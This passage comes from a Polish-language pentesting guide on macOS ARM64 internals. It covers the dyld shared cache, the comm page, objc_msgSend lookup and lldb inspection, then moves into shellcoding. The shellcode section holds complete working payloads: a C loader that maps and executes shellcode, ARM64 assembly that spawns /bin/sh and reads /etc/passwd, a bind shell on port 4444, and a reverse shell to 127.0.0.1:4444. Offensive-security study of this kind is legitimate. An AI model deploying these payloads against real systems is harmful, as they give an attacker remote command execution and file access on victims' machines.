dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Zauważ, że **Ida** i **Ghidra** mogą również zdekompilować **specific dylibs** z cache, po prostu podając cache.

> [!TIP]
> Czasami łatwiej jest sprawdzić **zdekompilowany** kod z **`libsystem_kernel.dylib`** niż sprawdzać **kod źródłowy**, ponieważ kod kilku syscalli (BSD i Mach) jest generowany za pomocą skryptów (sprawdź komentarze w kodzie źródłowym), podczas gdy w dylib możesz znaleźć, co jest wywoływane.

### machdep calls

XNU obsługuje inny typ wywołań zwanych machine dependent. Numery tych wywołań zależą od architektury i ani wywołania, ani ich numery nie są gwarantowane jako stałe.

### comm page

To jest strona pamięci należąca do kernela, która jest mapowana w przestrzeni adresowej każdego procesu użytkownika. Ma to na celu przyspieszenie przejścia z trybu użytkownika do przestrzeni jądra w porównaniu z używaniem syscalli dla usług jądra, które są używane tak często, że to przejście byłoby bardzo nieefektywne.

Na przykład wywołanie `gettimeofdate` odczytuje wartość `timeval` bezpośrednio z comm page.

### objc_msgSend

Bardzo często funkcję tę można znaleźć w programach Objective-C lub Swift. Funkcja ta pozwala wywołać metodę obiektu Objective-C.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Wskaźnik do instancji
- x1: op -> Selektor metody
- x2... -> Pozostałe argumenty wywoływanej metody

Jeśli ustawisz breakpoint przed skokiem do tej funkcji, możesz łatwo znaleźć, co jest wywoływane w lldb (w tym przykładzie obiekt wywołuje obiekt z `NSConcreteTask`, który uruchomi polecenie):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Ustawiając zmienną środowiskową **`NSObjCMessageLoggingEnabled=1`** można użyć **log**, aby zapisać, kiedy ta funkcja jest wywoływana, do pliku takiego jak `/tmp/msgSends-pid`.
>
> Ponadto, ustawiając **`OBJC_HELP=1`** i uruchamiając dowolny binarny plik, możesz zobaczyć inne zmienne środowiskowe, których można użyć do **log**, aby rejestrować występowanie określonych akcji Objc-C.

Gdy ta funkcja jest wywoływana, trzeba znaleźć wywoływaną metodę wskazanego egzemplarza; w tym celu wykonywane są różne wyszukiwania:

- Perform optimistic cache lookup:
- If successful, done
- Acquire runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Try class own cache:
- If successful, done
- Try class method list:
- If found, fill cache and done
- Try superclass cache:
- If successful, done
- Try superclass method list:
- If found, fill cache and done
- If (resolver) try method resolver, and repeat from class lookup
- If still here (= all else has failed) try forwarder

### Shellcodes

Aby skompilować:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Aby wyodrębnić bajty:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Dla nowszych wersji macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Kod C do testowania shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Pobrane z [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i wyjaśnione.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Odczyt przy użyciu cat

Celem jest wykonanie `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, więc drugi argument (x1) jest tablicą params (co w pamięci oznacza stack adresów).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Wywołaj polecenie przez sh z forka, aby główny proces nie został zabity
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell z [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s] na **porcie 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Z [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s], revshell do **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
